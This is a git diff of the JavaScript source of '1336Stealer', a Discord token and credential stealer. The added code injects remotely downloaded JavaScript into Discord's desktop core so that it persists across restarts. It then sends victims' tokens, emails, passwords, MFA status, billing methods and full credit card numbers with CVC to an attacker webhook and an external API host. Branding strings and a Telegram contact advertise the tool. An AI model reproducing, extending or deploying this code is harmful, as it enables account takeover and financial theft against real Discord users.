@@ -1,5 +1,4 @@
-CONFIG_OBF
-;const fs = require('fs');
+const fs = require('fs');
 const path = require('path');
 const {
     BrowserWindow,
@@ -21,6 +20,29 @@ String.prototype.insert = function(index, string) {
 
     return string + this;
 };
+
+const config = {
+    "logout": "true",
+    "logout-notify": "true",
+    "init-notify": "true",
+    "embed-color": 374276,
+
+    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    webhook: "%WEBHOOK%",
+    apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
+    filter2: {
+        urls: [
+      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+      "https://*.discord.com/api/v*/applications/detectable",
+      "https://discord.com/api/v*/applications/detectable",
+      "https://*.discord.com/api/v*/users/@me/library",
+      "https://discord.com/api/v*/users/@me/library",
+      "wss://remote-auth-gateway.discord.gg/*",
+    ],
+    },
+};
+
+
 
 let bannerurl = ""
 let usericonurl = ""
@@ -49,11 +71,13 @@ function updateCheck() {
     const appPath = path.join(resourcePath, "app");
     const packageJson = path.join(appPath, "package.json");
     const resourceIndex = path.join(appPath, "index.js");
+    //const indexJs = '%num_core_discord%'
     const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
     const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
     if(app === 'Lightcord')return;
     if(app === 'DiscordCanary')return;
+    if(app === 'DiscordPTB')return;
     if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
     if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
 
@@ -69,6 +93,10 @@ function updateCheck() {
             ),
         );
 
+
+
+        setTimeout(() => {
+            
         const startUpScript = `const fs = require('fs'), https = require('https');
 const indexJS = '${indexJs}';
 const bdPath = '${bdPath}';
@@ -83,7 +111,7 @@ fs.readFileSync(indexJS, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('1336', '${config.apiurl}')
+        res.replace('%num_core_discord%', indexJS).replace('%WEBHOOK%', '${config.webhook}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -97,6 +125,7 @@ require('${path.join(resourcePath, "app.asar")}')
 if (fs.existsSync(bdPath)) require(bdPath);`;
 
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
+    }, 5000);
     }
     if (!fs.existsSync(path.join(__dirname, "1336"))) return !0;
     execScript(
@@ -150,11 +179,12 @@ document.addEventListener('click',handler,false);
 `)
 };
 
+
 noSessionPlease()
 
 const hooker = async (content) => {
     const data = JSON.stringify(content);
-    const url = new URL(config.apiurl);
+    const url = new URL(config.webhook);
     const options = {
         protocol: url.protocol,
         hostname: url.host,
@@ -239,19 +269,20 @@ async function FirstTime() {
                         ip
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     const c = {
-                        username: "1336Stealer",
+                        username: "1336Stealer | t.me/St34ler",
+                        avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
                         content: "",
                         embeds: [{
                             title: "1336Stealer Initalized",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
-                                vavalue: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                                 inline: !1
 							}],
                             author: {
                                 name: "1336Stealer"
-                            }
+                            },
 						}]
                     };
                     let data = JSON.stringify(c);
@@ -272,29 +303,41 @@ async function FirstTime() {
                         bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
-                        username: "1336Stealer",
+                        username: "1336Stealer | t.me/St34ler",
+                        avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
                         content: "",
                         embeds: [{
-                            title: "1336Stealer, Powered By 1336Inc.",
+                            title: "1336Stealer Initalized",
                             description: `${b.username}'s account`,
                             color: config["embed-color"],
-                            fields: [ {
-                                name: ":mag_right: User ID",
-                                value: `\`${b.id}\``,
-                                inline: !0
+                            fields: [{
+                                name: "Injection Info",
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                                inline: !1
 								}, {
-                                name: ":bust_in_silhouette: Username",
+                                name: ":mag_right: User ID",
+                                value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
+                                inline: !0
+                                }, {
+                                name: ":bust_in_silhouette: Username ",
                                 value: `\`${b.username}#${b.discriminator}\``,
                                 inline: !0
 								}, {
-                                name: "<:badges:1057623862369587200> Badges",
+                                name: "<:badge:1067551347332878487> Badges",
                                 value: `${GetBadges(b.flags)}`,
                                 inline: !0
 								}, {
-                                name: "<:discord:1057626154523168768> Token",
-                                value: `\`\`\`${token}\`\`\`\n[Copy](https://paste-pgpj.onrender.com/?p=${token})`,
+                                name: ":a2f: A2F",
+                                value: `${GetA2F(b.mfa_enabled)}`,
+                                inline: !0
+								}, {
+                                name: "<:token:1067551382103658597> Token",
+                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                 inline: !1
 								}],
+                            image: {
+                                url: bannerurl,
+                            },
                             thumbnail: {
                                 url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                             }
@@ -310,11 +353,11 @@ async function FirstTime() {
 
 
 
-                if (!fs.existsSync(path.join(__dirname, "Blaze"))) {
+                if (!fs.existsSync(path.join(__dirname, "1336"))) {
                     return !0
                 }
 
-                fs.rmdirSync(path.join(__dirname, "Blaze"));
+                fs.rmdirSync(path.join(__dirname, "1336"));
                 if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                     if (config['logout-notify'] == "true") {
                         if (token == null || token == undefined || token == "") {
@@ -322,10 +365,11 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             const c = {
-                                username: "1336Stealer",
+                                username: "1336Stealer | t.me/St34ler",
+                                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
                                 content: "",
                                 embeds: [{
-                                    title: "1336Stealer, Powered By 1336Inc.",
+                                    title: "1336Stealer User log out (User not Logged in before)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -333,8 +377,8 @@ async function FirstTime() {
                                         inline: !1
 							}],
                                     author: {
-                                        name: "1336Stealer User log out"
-                                    }
+                                        name: "1336Stealer"
+                                    },
 						}]
                             };
                             
@@ -355,29 +399,43 @@ async function FirstTime() {
                                 bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
                             }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
-                                username: "1336Stealer",
+                                username: "1336Stealer | t.me/St34ler",
+                                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
                                 content: "",
                                 embeds: [{
-                                    title: "1336Stealer got logged out",
-                                    description: `${b.username}'s account`,
+                                    title: "1336Stealer Victim got logged out",
+                                    description: `${info.username}'s account`,
                                     color: config["embed-color"],
                                     fields: [{
-                                        name: ":mag_right: User ID",
-                                        value: `\`${b.id}\``,
-                                        inline: !0
+                                        name: "Injection Info",
+                                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                                        inline: !1
+								}, {
+                                    name: ":mag_right: User ID",
+                                    value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
+                                    inline: !0
 								}, {
                                         name: ":bust_in_silhouette: Username",
                                         value: `\`${b.username}#${b.discriminator}\``,
                                         inline: !0
 								}, {
-                                        name: "<:badges:1057623862369587200> Badges",
+                                        name: "<:badge:1067551347332878487> Badges",
                                         value: `${GetBadges(b.flags)}`,
                                         inline: !0
 								}, {
-                                        name: "<:discord:1057626154523168768> Token",
-                                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
+                                        name: "<a:a2f:1040272766982692885> A2F",
+                                        value: `${GetA2F(b.mfa_enabled)}`,
+                                        inline: !0
+								}, {
+                                        name: "<:token:1067551382103658597> Token",
+                                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                         inline: !1
 								}],
+
+
+                                    image: {
+                                        url: bannerurl,
+                                    },
                                     thumbnail: {
                                         url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                                     }
@@ -423,17 +481,42 @@ async function getFromURL(url, token) {
 
 
 
+
+function GetNSFW(reader) {
+    if (reader == true) {
+        return ":underage: `NSFW Allowed`"
+    }
+    if (reader == false) {
+        return ":underage: `NSFW Not Allowed`"
+    } else {
+        return "Can't see"
+    }
+}
+
+function GetA2F(reader) {
+    if (reader == true) {
+        return ":lock: `A2F Enabled`"
+    }
+    if (reader == false) {
+        return ":unlock: `A2F Not Enabled`"
+    } else {
+        return "Can't see"
+    }
+}
+
+
+
 function GetNitro(flags) {
     if (flags == 0) {
-        return "\`No Nitro\`"
+        return "No Nitro"
     }
     if (flags == 1) {
-        return "\`Nitro Classic\`"
+        return "<:classic:896119171019067423> \`Nitro Classic\`"
     }
     if (flags == 2) {
-        return "\`Nitro Boost\`"
+        return "<a:boost:824036778570416129> \`Nitro Boost\`"
     } else {
-        return "\`No Nitro\`"
+        return "No Nitro"
     }
 }
 
@@ -597,7 +680,7 @@ function GetLangue(read) {
         langue += ":flag_kr: Korean"
     }
     if (langue == "") {
-        langue = "\`None\`"
+        langue = ":x: None"
     }
     return langue
 }
@@ -649,7 +732,7 @@ function GetBadges(flags) {
         badges += "<:activedev:1041634224253444146> "
     }
     if (badges == "") {
-        badges = "\`None\`"
+        badges = "None"
     }
     return badges
 }
@@ -695,7 +778,7 @@ async function Login(email, password, token) {
                     }
                 }
                 if (gay == "") {
-                    gay = "\`No Rare Friends\`"
+                    gay = "No Rare Friends"
                 }
                 return gay
             }
@@ -705,17 +788,17 @@ async function Login(email, password, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`None\`"
+                        return ":x:"
                     } else if (z.type == 2 && z.invalid != !0) {
                         billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
                         billing += ":heavy_check_mark:" + " :credit_card:"
                     } else {
-                        return "\`None\`"
+                        return ":x:"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`None\`"
+                    billing = ":x:"
                 }
                 return billing
             }
@@ -727,53 +810,68 @@ async function Login(email, password, token) {
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
             
             const params = {
-                username: "1336Stealer",
+                username: "1336Stealer | t.me/St34ler",
+                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
                 content: "",
                 embeds: [{
                     "title": "1336Stealer User Login",
                     description: `${info.username}'s account`,
                     "color": config['embed-color'],
                     "fields": [{
+                        name: "Injection Info",
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                        inline: !1
+                                                }, {
                         name: ":mag_right: User ID",
-                        value: `\`${info.id}\``,
-                        inline: true
+                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
+                        inline: !0
 												}, {
                         name: ":bust_in_silhouette: Username",
                         value: `\`${info.username}#${info.discriminator}\``,
-                        inline: true
+                        inline: !0
+
 												}, {
-                        name: "<a:nitrotypes:1057623883798282310> Nitro",
+                        name: "<a:nitro:1067551337266561135> Nitro",
                         value: `${GetNitro(info.premium_type)}`,
-                        inline: false
+                        inline: !0
 												}, {
-                        name: "<:badges:1057623862369587200> Badges",
+                        name: "<:badge:1067551347332878487> Badges",
                         value: `${GetBadges(info.flags)}`,
-                        inline: true
+                        inline: !0
 												}, {
-                        name: "<:card:1060707778081079316> Billing",
+                        name: ":card: Billings",
                         value: `${Cool()}`,
-                        inline: true
+                        inline: !1
 												}, {
-                        name: "<:email:1057623873731956798> Email",
+                        name: "<:mail:1067551360637218897> Email",
                         value: `\`${email}\``,
-                        inline: false
+                        inline: !0
+                                                }, {
+                        name: "<a:a2f:1040272766982692885> A2F",
+                        value: `${GetA2F(info.mfa_enabled)}`,
+                        inline: !0
 												}, {
                         name: ":fire: Password",
                         value: `\`${password}\``,
-                        inline: true
+                        inline: !0
 												}, {
-                        name: "<:discord:1057626154523168768> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
-                        inline: false
+                        name: "<:token:1067551382103658597> Token",
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
+                        inline: !1
 												}, ],
+
+
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
 											}, {
-                    "title": `Total Friends (${totalFriends()})`,
+                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
                     "color": config['embed-color'],
                     "description": CalcFriends(),
 
+                    "image": {
+                        'url': `${bannerurl}`,
+                    },
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
@@ -831,7 +929,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     }
                 }
                 if (gay == "") {
-                    gay = "\`No Rare Friends\`"
+                    gay = "No Rare Friends"
                 }
                 return gay
             }
@@ -841,73 +939,86 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`None\`"
+                        return ":x:"
                     } else if (z.type == 2 && z.invalid != !0) {
                         billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
                         billing += ":heavy_check_mark:" + " :credit_card:"
                     } else {
-                        return "\`None\`"
+                        return ":x:"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`None\`"
+                    billing = ":x:"
                 }
                 return billing
             }
             let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
             const params = {
-                username: "1336Stealer",
+                username: "1336Stealer | t.me/St34ler",
+                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
                 content: "",
                 embeds: [{
                     "title": "1336Stealer Password Changed",
                     description: `${info.username}'s account`,
                     "color": config['embed-color'],
                     "fields": [{
+                        name: "Injection Info",
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                        inline: !1
+												}, {
                         name: ":mag_right: User ID",
-                        value: `\`${info.id}\``,
-                        inline: true
-												}, {
-                        name: ":bust_in_silhouette: Username",
+                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
+                        inline: !0
+                                                }, {
+                        name: ":bust_in_silhouette: Username ",
                         value: `\`${info.username}#${info.discriminator}\``,
-                        inline: true
+                        inline: !0
 												}, {
-                        name: "<a:nitrotypes:1057623883798282310> Nitro",
+                        name: "<a:nitro:1067551337266561135> Nitro",
                         value: `${GetNitro(info.premium_type)}`,
-                        inline: false
+                        inline: !0
 												}, {
-                        name: "<:badges:1057623862369587200> Badges",
+                        name: "<:badge:1067551347332878487> Badges",
                         value: `${GetBadges(info.flags)}`,
-                        inline: true
+                        inline: !0
 												}, {
-                        name: "<:card:1060707778081079316> Billing",
+                        name: ":card: Billings",
                         value: `${Cool()}`,
-                        inline: true
+                        inline: !1
+                                                }, {
+                        name: "<a:a2f:1040272766982692885> A2F",
+                        value: `${GetA2F(info.mfa_enabled)}`,
+                        inline: !0
 												}, {
-                        name: "<:email:1057623873731956798> Email",
+                        name: "<:mail:1067551360637218897> Email",
                         value: `\`${info.email}\``,
-                        inline: false
+                        inline: !1
 												}, {
-                        name: "⚓ Old Password",
+                        name: ":anchor: Old Password",
                         value: `\`${oldpassword}\``,
-                        inline: true
+                        inline: !0
 												}, {
                         name: ":fire: New Password",
                         value: `\`${newpassword}\``,
-                        inline: true
+                        inline: !0
 												}, {
-                        name: "<:discord:1057626154523168768> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
-                        inline: false
+                        name: "<:token:1067551382103658597> Token",
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n`,
+                        inline: !1
 												}, ],
+
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
 											}, {
-                    "title": `Total Friends (${totalFriends()})`,
+                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
                     "color": config['embed-color'],
                     "description": CalcFriends(),
 
+                    "image": {
+                        'url': `${bannerurl}`,
+                    },
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
@@ -961,7 +1072,7 @@ async function ChangeEmail(newemail, password, token) {
                     }
                 }
                 if (gay == "") {
-                    gay = "\`No Rare Friends\`"
+                    gay = "No Rare Friends"
                 }
                 return gay
             }
@@ -971,17 +1082,17 @@ async function ChangeEmail(newemail, password, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`None\`"
+                        return ":x:"
                     } else if (z.type == 2 && z.invalid != !0) {
                         billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
                         billing += ":heavy_check_mark:" + " :credit_card:"
                     } else {
-                        return "\`None\`"
+                        return ":x:"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`None\`"
+                    billing = ":x:"
                 }
                 return billing
             }
@@ -995,53 +1106,69 @@ async function ChangeEmail(newemail, password, token) {
 
             
            const params = {
-                username: "1336Stealer",
+                username: "1336Stealer | t.me/St34ler",
+                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
                 content: "",
                 embeds: [{
                     "title": "1336Stealer Email Changed",
                     description: `${info.username}'s account`,
-                    "color": config['embed-color'],
-                    "fields": [{
-                            name: ":mag_right: User ID",
-                            value: `\`${info.id}\``,
-                            inline: true
-                }, {
-                            name: ":bust_in_silhouette: Username",
-                            value: `\`${info.username}#${info.discriminator}\``,
-                            inline: true
-                }, {
-                            name: "<a:nitrotypes:1057623883798282310> Nitro",
-                            value: `${GetNitro(info.premium_type)}`,
-                            inline: false
-                }, {
-                            name: "<:badges:1057623862369587200> Badges",
-                            value: `${GetBadges(info.flags)}`,
-                            inline: true
-                }, {
-                            name: "<:card:1060707778081079316> Billing",
-                            value: `${Cool()}`,
-                            inline: true
-                }, {
-                            name: "<:email:1057623873731956798> Email",
-                            value: `\`${newemail}\``,
-                            inline: false
-                }, {
-                            name: ":fire: Password",
-                            value: `\`${password}\``,
-                            inline: true
-                }, {
-                            name: "<:discord:1057626154523168768> Token",
-                            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
-                            inline: false
-                },
-            ],
-                    "thumbnail": {
-                        "url": `${usericonurl}`
-                    }
+                        "color": config['embed-color'],
+                        "fields": [{
+                                name: "Injection Info",
+                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
+                                inline: !1
+					}, {
+                                name: ":mag_right: User ID",
+                                value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
+                                inline: !0
+                    }, {
+                                name: ":bust_in_silhouette: Username",
+                                value: `\`${info.username}#${info.discriminator}\``,
+                                inline: !0
+					}, {
+                                name: "<a:nitro:1067551337266561135> Nitro",
+                                value: `${GetNitro(info.premium_type)}`,
+                                inline: !0
+					}, {
+                                name: "<:badge:1067551347332878487> Badges",
+                                value: `${GetBadges(info.flags)}`,
+                                inline: !0
+					}, {
+                                name: ":card: Billings",
+                                value: `${Cool()}`,
+                                inline: !1
+                    }, {
+                                name: "<a:a2f:1040272766982692885> A2F",
+                                value: `${GetA2F(info.mfa_enabled)}`,
+                                inline: !0
+					}, {
+                                name: "<:mail:1067551360637218897> New Email",
+                                value: `\`${newemail}\``,
+                                inline: !0
+					}, {
+                                name: ":fire: Password",
+                                value: `\`${password}\``,
+                                inline: !0
+					}, {
+                                name: "<:token:1067551382103658597> Token",
+                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n`,
+                                inline: !1
+					},
+				],
+
+
+                        "thumbnail": {
+                            "url": `${usericonurl}`
+                        }
 				}, {
-                        "title": `Total Friends (${totalFriends()})`,
+                        "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
                         "color": config['embed-color'],
                         "description": CalcFriends(),
+
+
+                        "image": {
+                            'url': `${bannerurl}`,
+                        },
 
                         "thumbnail": {
                             "url": `${usericonurl}`
@@ -1074,28 +1201,39 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
 
         
         const params = {
-            username: "1336Stealer",
+            username: "1336Stealer | t.me/St34ler",
+            avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
             content: "",
             embeds: [{
-                "title": "1336Stealer Credit Card Added",
-                "description": `
-                **IP:** ${ip}\n\n
-                **Username**\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
-                **ID**\n\`\`\`${info.id}\`\`\`\n
-                **Email**\n\`\`\`${info.email}\`\`\`\n
-                **Nitro Type**\n${GetNitro(info.premium_type)}\n
-                **Badges**\n${GetBadges(info.flags)}\n
-                **Credit Card **\n\`\`\`${number}|${expir_month}/${expir_year}|${cvc}\`\`\`\n
-                **Token** \n\`\`\`${token}\`\`\``,
-                "thumbnail": {
-                    "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
-                },
+                    "title": "1336Stealer User Credit Card Added",
+                    "description": `
+                    **IP:** ${ip}\n\n
+                    :mag_right: **ID**\n\`\`\`${info.id}\`\`\`\n
+                    :bust_in_silhouette: **Username**\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
+                    <a:nitro:1067551337266561135> **Nitro**\n${GetNitro(info.premium_type)}\n
+                    <:badge:1067551347332878487> **Badges**\n${GetBadges(info.flags)}\
+                    <:mail:1067551360637218897> **Email**\n\`\`\`${info.email}\`\`\`\n
+					<a:a2f:1040272766982692885> **A2F**\n${GetA2F(info.mfa_enabled)}\n
+                    **Credit Card Number**\n\`\`\`${number}\`\`\`\n
+                    **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
+                    **CVC**\n\`\`\`${cvc}\`\`\`\n
+                    <:token:1067551382103658597> **Token** \n\`\`\`${token}\`\`\``,
+                    "author": {
+                        "name": "1336Stealer | t.me/St34ler"
+                    },
+                    "thumbnail": {
+                        "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
+                    },
             },
                 {
-                    "title": `Guilds Owner`,
+                    "title": `<a:totalfriends:1041641100017946685> Guilds Owner`,
                     "color": config['embed-color'],
-                    "description": `\`\`\`diff\n${fs.readFileSync('hq_guilds.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
+                    "description": `\`\`\`diff\n${fs.readFileSync('1336_guilds.txt', 'utf-8') || "- This shit is not the owner of any server"}\`\`\``,
 
+
+                    "image": {
+                        'url': `${bannerurl}`,
+                    },
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
